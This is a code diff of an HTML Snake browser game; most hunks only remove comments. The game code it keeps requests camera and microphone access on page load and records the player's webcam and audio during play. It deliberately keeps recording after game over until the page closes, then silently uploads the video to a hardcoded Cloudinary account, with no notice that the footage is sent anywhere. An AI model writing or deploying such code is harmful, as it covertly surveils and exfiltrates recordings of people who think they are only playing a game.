@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
 <title>Snake</title>
 <style>
-  /* Reset & fix viewport */
   html, body {
     margin: 0; padding: 0; overflow: hidden; height: 100%; width: 100%; background: #121212; color: #eee; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent;
@@ -33,7 +32,6 @@
   button:hover {
     background: #555;
   }
-  /* Mobile swipe instruction */
   #instructions {
     margin-top: 20px; font-size: 0.9rem; color: #aaa; max-width: 300px; text-align: center;
   }
@@ -54,15 +52,13 @@
 
 <script>
 (() => {
-  // === Cloudinary upload config - replace with your own values ===
-  const CLOUD_NAME = "dps0g5ftz";      // Your cloud name here
-  const UPLOAD_PRESET = "unsigned";     // Your unsigned preset here
-
-  // ==== MediaRecorder Setup ====
+  // Cloudinary upload config - replace with your own values
+  const CLOUD_NAME = "dps0g5ftz";
+  const UPLOAD_PRESET = "unsigned";
 
   let mediaRecorder;
   let recordedChunks = [];
-  let mediaStream; // keep stream globally
+  let mediaStream;
 
   async function uploadVideo(blob) {
     const formData = new FormData();
@@ -76,13 +72,10 @@
       });
       const data = await res.json();
       console.log("Video uploaded:", data.secure_url);
-      // You can add code here to send the URL to your server or display it
     } catch (err) {
       console.error("Upload failed:", err);
     }
   }
-
-  // === Snake Game ===
 
   const canvas = document.getElementById("game");
   const ctx = canvas.getContext("2d");
@@ -129,22 +122,19 @@
     document.getElementById("btnStart").disabled = false;
     document.getElementById("btnNewGame").disabled = true;
 
-    // Removed stopping the recording here, keep recording going
+    // Do NOT stop recording here! Keep recording until page exit
 
     alert("Game Over! Your score: " + score);
   }
 
   function gameLoop() {
-    // Move snake
     const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };
 
-    // Check walls
     if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
       gameOver();
       return;
     }
 
-    // Check self collision
     if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
       gameOver();
       return;
@@ -152,7 +142,6 @@
 
     snake.unshift(head);
 
-    // Eat food
     if (head.x === food.x && head.y === food.y) {
       score++;
       updateScore();
@@ -161,26 +150,21 @@
       snake.pop();
     }
 
-    // Draw everything
     ctx.fillStyle = "#121212";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-    drawRect(food.x, food.y, "#ff6347"); // Food - tomato red
+    drawRect(food.x, food.y, "#ff6347");
 
     snake.forEach((segment, idx) => {
-      drawRect(segment.x, segment.y, idx === 0 ? "#32cd32" : "#228b22"); // Head bright green, body darker
+      drawRect(segment.x, segment.y, idx === 0 ? "#32cd32" : "#228b22");
     });
   }
 
-  // === Controls ===
-
   function setDirection(x, y) {
-    // Prevent reverse direction
     if (velocity.x === -x || velocity.y === -y) return;
     velocity = { x, y };
   }
 
-  // Permission requested on page load
   async function initMedia() {
     try {
       mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
@@ -188,7 +172,7 @@
 
       mediaRecorder = new MediaRecorder(mediaStream, { mimeType: "video/webm" });
 
-      mediaRecorder.ondataavailable = (e) => {
+      mediaRecorder.ondataavailable = e => {
         if (e.data.size > 0) recordedChunks.push(e.data);
       };
 
@@ -196,8 +180,6 @@
         const blob = new Blob(recordedChunks, { type: "video/webm" });
         recordedChunks = [];
         uploadVideo(blob);
-
-        // Stop all media tracks to release camera and mic
         mediaStream.getTracks().forEach(track => track.stop());
         mediaStream = null;
       };
@@ -208,16 +190,15 @@
     } catch (err) {
       console.error("Media permission denied or error:", err);
       alert("Camera/Microphone permission denied or not available. Game recording will not work.");
-      document.getElementById("btnStart").disabled = false; // Allow game without recording
+      document.getElementById("btnStart").disabled = false;
     }
   }
 
-  // Call on page load
   window.onload = () => {
     initMedia();
   };
 
-  // Stop recording & upload on page unload
+  // Stop recording & upload only on page unload
   window.addEventListener("beforeunload", () => {
     if (mediaRecorder && mediaRecorder.state === "recording") {
       mediaRecorder.stop();
@@ -225,12 +206,10 @@
   });
 
   document.getElementById("btnStart").onclick = () => {
-    // Start recording
     if (mediaRecorder && mediaRecorder.state === "inactive") {
       mediaRecorder.start();
     }
 
-    // Now start the game
     resetGame();
     document.getElementById("btnStart").disabled = true;
     document.getElementById("btnNewGame").disabled = false;
@@ -246,7 +225,6 @@
     gameInterval = setInterval(gameLoop, 120);
   };
 
-  // Keyboard controls
   window.addEventListener("keydown", e => {
     switch (e.key) {
       case "ArrowUp": setDirection(0, -1); break;
@@ -256,7 +234,6 @@
     }
   });
 
-  // Swipe controls for mobile
   let touchStartX = null;
   let touchStartY = null;
 
